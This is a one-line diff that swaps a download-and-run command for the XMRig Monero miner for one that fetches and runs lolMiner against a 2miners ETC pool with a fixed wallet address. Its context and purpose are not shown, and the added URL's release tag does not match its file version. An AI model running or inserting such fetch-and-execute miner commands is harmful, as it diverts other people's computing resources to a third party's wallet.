@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz && tar -xvf xmrig-6.18.1-linux-static-x64.tar.gz && cd xmrig-6.18.1 && ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbYgjxBBBAbaqK2uF5ys4hYUyL5t2AjNfHs -p x -k --nicehash -a rx/0
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.62_Lin64.tar.gz && tar -zxvf lolMiner_v1.62_Lin64.tar.gz && cd 1.62 && clear && ./lolMiner --algo ETHASH --pool asia-etc.2miners.com:1010 -u 0x4A492FdD5fea46bE16eA183999DbE80086f79D2B.teejiba
